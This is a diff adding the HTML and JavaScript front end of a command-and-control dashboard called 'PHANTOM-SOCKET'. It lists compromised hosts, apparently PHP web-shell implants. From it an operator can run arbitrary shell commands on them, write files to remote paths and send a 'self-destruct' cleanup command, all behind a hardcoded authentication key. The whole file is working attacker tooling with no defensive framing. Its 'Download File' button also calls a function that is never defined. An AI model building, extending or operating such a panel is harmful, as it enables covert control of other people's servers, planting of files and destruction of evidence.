@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHANTOM-SOCKET V3.1 - GHOST DASHBOARD</title>
+    <style>
+        :root {
+            --bg-color: #0d1117;
+            --panel-color: #161b22;
+            --text-color: #c9d1d9;
+            --accent-color: #238636;
+            --border-color: #30363d;
+            --error-color: #f85149;
+            --info-color: #58a6ff;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            display: flex;
+            height: 100vh;
+        }
+        #sidebar {
+            width: 300px;
+            background-color: var(--panel-color);
+            border-right: 1px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+        }
+        #main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .header {
+            padding: 20px;
+            border-bottom: 1px solid var(--border-color);
+            font-weight: bold;
+            font-size: 1.2em;
+            letter-spacing: 2px;
+            text-align: center;
+        }
+        .agent-list {
+            flex: 1;
+            overflow-y: auto;
+        }
+        .agent-item {
+            padding: 15px;
+            border-bottom: 1px solid var(--border-color);
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .agent-item:hover {
+            background-color: #21262d;
+        }
+        .agent-item.active {
+            border-left: 4px solid var(--accent-color);
+            background-color: #1f2937;
+        }
+        .agent-name {
+            font-weight: bold;
+            display: block;
+        }
+        .agent-status {
+            font-size: 0.8em;
+            color: #8b949e;
+        }
+        .status-online { color: var(--accent-color); }
+        .status-offline { color: var(--error-color); }
+
+        #terminal-container {
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            background-color: #000;
+        }
+        #terminal-output {
+            flex: 1;
+            overflow-y: auto;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.9em;
+            white-space: pre-wrap;
+            margin-bottom: 10px;
+        }
+        .terminal-input-group {
+            display: flex;
+            border-top: 1px solid var(--border-color);
+            padding-top: 10px;
+        }
+        .terminal-input-group span {
+            padding: 10px;
+            color: var(--accent-color);
+        }
+        #terminal-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #fff;
+            padding: 10px;
+            font-family: 'Courier New', Courier, monospace;
+            outline: none;
+        }
+        .controls {
+            padding: 20px;
+            background-color: var(--panel-color);
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            gap: 10px;
+        }
+        button {
+            background-color: var(--accent-color);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover { background-color: #2ea043; }
+        button.secondary { background-color: #30363d; border: 1px solid var(--border-color); }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            justify-content: center; align-items: center;
+        }
+        .modal-content {
+            background: var(--panel-color);
+            padding: 30px;
+            border-radius: 8px;
+            width: 400px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            background: #0d1117;
+            border: 1px solid var(--border-color);
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div id="sidebar">
+        <div class="header">GHOST PROTOCOL</div>
+        <div id="agent-list" class="agent-list">
+            <!-- Agents populated here -->
+        </div>
+        <div class="header" style="font-size: 0.8em; border-top: 1px solid var(--border-color); border-bottom: none;">
+            RELAY: ACTIVE
+        </div>
+    </div>
+    <div id="main">
+        <div id="terminal-container">
+            <div id="terminal-output">PHANTOM-SOCKET V3.1 READY. SELECT AN AGENT.</div>
+            <div class="terminal-input-group">
+                <span>$</span>
+                <input type="text" id="terminal-input" placeholder="Enter command..." autocomplete="off">
+            </div>
+        </div>
+        <div class="controls">
+            <button onclick="refreshAgents()">Refresh Agents</button>
+            <button class="secondary" onclick="showUploadModal()">Upload File</button>
+            <button class="secondary" onclick="showDownloadModal()">Download File</button>
+            <button style="background-color: var(--error-color)" onclick="cleanupAgent()">Self-Destruct</button>
+        </div>
+    </div>
+
+    <!-- Modals -->
+    <div id="upload-modal" class="modal">
+        <div class="modal-content">
+            <h3>Upload File</h3>
+            <input type="text" id="upload-local" placeholder="Local path (B64 Content)">
+            <input type="text" id="upload-remote" placeholder="Remote destination path">
+            <button onclick="performUpload()">Upload</button>
+            <button class="secondary" onclick="closeModals()">Cancel</button>
+        </div>
+    </div>
+
+    <script>
+        const AUTH_KEY = "PREDATOR-X-2026-KINETIC-PRODUCTION";
+        let selectedAgent = null;
+
+        async function apiCall(endpoint, method = 'GET', body = null) {
+            const options = {
+                method,
+                headers: {
+                    'X-Auth': AUTH_KEY,
+                    'Content-Type': 'application/json'
+                }
+            };
+            if (body) options.body = JSON.stringify(body);
+            const res = await fetch(endpoint, options);
+            return res.json();
+        }
+
+        async function refreshAgents() {
+            const agents = await apiCall('/api/agents');
+            const list = document.getElementById('agent-list');
+            list.innerHTML = '';
+            agents.forEach(a => {
+                const div = document.createElement('div');
+                div.className = `agent-item ${selectedAgent === a.id ? 'active' : ''}`;
+                div.onclick = () => selectAgent(a.id);
+                div.innerHTML = `
+                    <span class="agent-name">${a.info.hostname}</span>
+                    <span class="agent-status ${Date.now() - a.info.last_seen < 60000 ? 'status-online' : 'status-offline'}">
+                        ${a.id.substring(0,8)} | ${a.info.os} | PHP ${a.info.php_ver}
+                    </span>
+                `;
+                list.appendChild(div);
+            });
+        }
+
+        function selectAgent(id) {
+            selectedAgent = id;
+            document.getElementById('terminal-output').innerHTML += `\n[INFO] Switched to agent: ${id}`;
+            refreshAgents();
+        }
+
+        document.getElementById('terminal-input').addEventListener('keypress', async (e) => {
+            if (e.key === 'Enter' && selectedAgent) {
+                const cmd = e.target.value;
+                e.target.value = '';
+                logToTerminal(`\n> ${cmd}`);
+                
+                const res = await apiCall('/api/cmd', 'POST', {
+                    agent_id: selectedAgent,
+                    command: 'exec',
+                    args: { cmd }
+                });
+                
+                if (res.task_id) {
+                    pollResult(res.task_id);
+                }
+            }
+        });
+
+        async function pollResult(taskId) {
+            const interval = setInterval(async () => {
+                const res = await apiCall(`/api/cmd/${taskId}`);
+                if (res.output) {
+                    logToTerminal(`\n${res.output}`);
+                    clearInterval(interval);
+                } else if (res.error) {
+                    logToTerminal(`\n[ERROR] ${res.error}`);
+                    clearInterval(interval);
+                }
+            }, 2000);
+        }
+
+        function logToTerminal(msg) {
+            const out = document.getElementById('terminal-output');
+            out.innerHTML += msg;
+            out.scrollTop = out.scrollHeight;
+        }
+
+        function showUploadModal() { document.getElementById('upload-modal').style.display = 'flex'; }
+        function closeModals() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
+
+        async function performUpload() {
+            const local = document.getElementById('upload-local').value;
+            const remote = document.getElementById('upload-remote').value;
+            if (!selectedAgent) return;
+
+            const res = await apiCall('/api/cmd', 'POST', {
+                agent_id: selectedAgent,
+                command: 'write',
+                args: { path: remote, data: local }
+            });
+            logToTerminal(`\n[INFO] Upload task queued: ${res.task_id}`);
+            closeModals();
+        }
+
+        async function cleanupAgent() {
+            if (!selectedAgent || !confirm('Trigger self-destruct?')) return;
+            await apiCall('/api/cmd', 'POST', {
+                agent_id: selectedAgent,
+                command: 'cleanup',
+                args: {}
+            });
+            logToTerminal(`\n[WARN] Cleanup command sent to ${selectedAgent}`);
+        }
+
+        setInterval(refreshAgents, 10000);
+        refreshAgents();
+    </script>
+</body>
+</html>
